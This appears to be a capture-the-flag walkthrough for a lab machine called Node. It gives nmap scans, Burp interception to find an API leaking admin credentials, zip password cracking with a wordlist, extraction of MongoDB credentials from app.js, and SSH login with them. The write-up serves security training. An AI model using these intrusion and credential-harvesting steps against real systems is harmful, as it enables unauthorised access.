## Node

#### Scan to discover open ports
```sh
nmap -sS -P0 -n -p- -T5 -oA nmap-tcp-allports-fast 10.10.10.58
```

#### Enumerate the discovered ports
```sh
nmap -sV -n -sC -p22,3000 -oA nmap-tcp-foundports 10.10.10.58
```

Gobuster/dirbuster doesn't work as every response returns 200.

So fire up burp to intercept a request to `http://10.10.10.58:3000/`. Notice that there are 2 responses; one for `/` as expected but then another one for `/<uuid>`.

Navigate to the `/<uuid>` link from a browser through Burp. Go to the Target -> Site Map tabs and expand the 10.10.10.58 host. Notice the `/api/users/latest` file and you should see json content. If not then you can run:
```sh
$ curl -s http://10.10.10.58:3000/api/users | json_pp
```


Naviagate to the login page in a web browser at `http://10.10.10.58:3000/login`, enter the admin credentials discovered in `http://10.10.10.58:3000/api/users` and click the `Login` button.
Once you'ev logged in, click the `Download Backup` button that is presented to you and save the file as `myplace.backup.zip`.

#### Decode the content to reveal a zip file
```sh
$ base64 --decode myplace.backup > myplace.backup.zip
```

#### Crack the zip file
```sh
$ crackzip -D -p /usr/share/wordlists/rockyou.txt -u myplace.backup.zip
```

#### Unzip the backup
```sh
$ unzip myplace.backup.zip
```

#### Review the app.js file
```sh
$ vim -R var/www/myspace/app.js
```

Notice the `const url` towards the top which contains a mongodb connection string including a username and password.

#### SSH into the Node box using the mongodb creds we just found
```sh
$ ssh 10.10.10.58 -l mark
```
